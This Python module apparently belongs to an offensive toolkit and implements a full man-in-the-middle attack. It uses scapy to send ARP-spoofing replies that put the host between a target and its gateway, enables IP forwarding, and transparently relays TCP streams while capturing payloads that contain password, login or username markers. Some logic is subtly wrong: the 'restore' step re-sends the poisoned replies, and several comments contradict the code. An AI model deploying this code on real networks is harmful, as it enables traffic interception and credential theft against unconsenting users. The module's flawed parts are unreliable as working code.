"""Man-in-the-Middle module: ARP spoofing + TCP forwarding + sniffing.

Core idea: put yourself on the wire between a target and its gateway by
poisoning ARP, then transparently forward TCP connections while logging the
payloads. Everything that needs a raw socket (ARP) is done inside scapy and
degrades cleanly without root; the TCP forwarder is pure Python.
"""

import asyncio
import sys
import time
from dataclasses import dataclass, field

from backrooms.core.exceptions import NetworkError

#: Substrings that mark a payload as credential-like.
CREDENTIAL_MARKERS = ("password", "passwd", "login", "username", "user=", "pass=")
REDACT = "████"


@dataclass
class MitmOptions:
    """Knobs for the MITM session."""

    reverse: bool = True
    verbosity: int = 1


@dataclass
class CredentialHit:
    """A credential-looking payload seen in a forwarded stream."""

    source: str
    direction: str
    payload: str
    marker: str

    @property
    def redacted(self) -> str:
        return REDACT


@dataclass
class MitmResult:
    """Aggregate of a MITM run."""

    forwarded: list[tuple[str, str, int]] = field(default_factory=list)
    credentials: list[CredentialHit] = field(default_factory=list)


def classify(payload: str) -> str | None:
    """Return the first credential marker found in payload (case-insensitive)."""
    low = payload.lower()
    for marker in CREDENTIAL_MARKERS:
        if marker in low:
            return marker
    return None


class ArpSpoof:
    """Poison the target<->gateway ARP cache to route traffic through us.

    Requires raw sockets (root). On Linux it enables IP forwarding so the
    OS relays traffic between the two ends.
    """

    def __init__(self, target_ip: str, gateway_ip: str, interface: str | None = None) -> None:
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self._running = False

    def _send(self, op: int, target: str, spoofed_for: str) -> None:
        from scapy.all import ARP, Ether, srp  # type: ignore[attr-defined]

        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=op,
            pdst=target,
            psrc=spoofed_for,
        )
        srp(pkt, iface=self.interface, timeout=2, verbose=False)

    def start(self) -> None:
        """Begin poisoning; call stop() in a finally block."""
        if not _have_root():
            raise NetworkError("ARP spoofing requires root (try: sudo backrooms mitm arp ...)")
        self._enable_ip_forward()
        self._running = True

    def poison_loop(self) -> None:
        """Send periodic poisoned ARP replies in a blocking loop."""
        self.start()
        try:
            while self._running:
                self._send(2, self.target_ip, self.gateway_ip)  # target -> us as gateway
                self._send(2, self.gateway_ip, self.target_ip)  # gateway -> us as target
                try:
                    time.sleep(2)
                except KeyboardInterrupt:
                    break
        finally:
            self.stop()

    def stop(self) -> None:
        """Restore the ARP cache and disable forwarding for the victim pair."""
        self._running = False
        try:
            self._send(2, self.target_ip, self.gateway_ip)
            self._send(2, self.gateway_ip, self.target_ip)
        except Exception:  # noqa: BLE001, S110 - best-effort restore
            pass

    @staticmethod
    def _enable_ip_forward() -> None:
        if sys.platform.startswith("linux"):
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as fh:
                    fh.write("1")
            except OSError:
                pass  # forwarding stays off; forwarding still works session-wide


class TcpForwarder:
    """Forward bytes between a client and a target server, capturing payloads."""

    def __init__(self, options: MitmOptions | None = None) -> None:
        self.options = options or MitmOptions()
        self._hits: list[CredentialHit] = []
        self._active = 0

    @property
    def hits(self) -> list[CredentialHit]:
        return self._hits

    async def run(
        self, local_host: str, local_port: int, target_host: str, target_port: int
    ) -> int:
        """Accept connections on local and forward each to target. Returns connection count."""
        server = await asyncio.start_server(
            lambda reader, writer: self._handle(reader, writer, target_host, target_port),
            local_host,
            local_port,
            reuse_address=True,
        )
        async with server:
            try:
                await server.serve_forever()  # runs until the task is cancelled
            except asyncio.CancelledError:
                server.close()
                await server.wait_closed()
                return self._active
        return self._active

    async def _handle(
        self,
        client_reader: asyncio.StreamReader,
        client_writer: asyncio.StreamWriter,
        target_host: str,
        target_port: int,
    ) -> None:
        try:
            target_reader, target_writer = await asyncio.open_connection(target_host, target_port)
        except OSError:
            client_writer.close()
            return
        self._active += 1
        peer = client_writer.get_extra_info("peername") or ("?", 0)
        src = f"{peer[0]}:{peer[1]}"

        async def pump(
            reader: asyncio.StreamReader,
            writer: asyncio.StreamWriter,
            direction: str,
        ) -> None:
            try:
                while (chunk := await reader.read(4096)):
                    writer.write(chunk)
                    await writer.drain()
                    self._capture(src, direction, chunk)
            except (asyncio.CancelledError, OSError, ConnectionError):
                pass
            finally:
                writer.close()
                try:
                    await writer.wait_closed()
                except (OSError, RuntimeError):
                    pass

        client_to_server = asyncio.create_task(pump(client_reader, target_writer, "c->s"))
        server_to_client = asyncio.create_task(pump(target_reader, client_writer, "s->c"))
        await asyncio.gather(client_to_server, server_to_client, return_exceptions=True)
        self._active -= 1
        client_writer.close()

    def _capture(self, source: str, direction: str, chunk: bytes) -> None:
        text = chunk.decode("utf-8", errors="replace")
        marker = classify(text)
        if marker is not None:
            self._hits.append(CredentialHit(source, direction, text.strip()[:200], marker))

    @property
    def active_connections(self) -> int:
        return self._active


def _have_root() -> bool:
    try:
        return bool(getattr(sys, "geteuid", lambda: 0)() == 0)
    except (AttributeError, OSError):
        return False
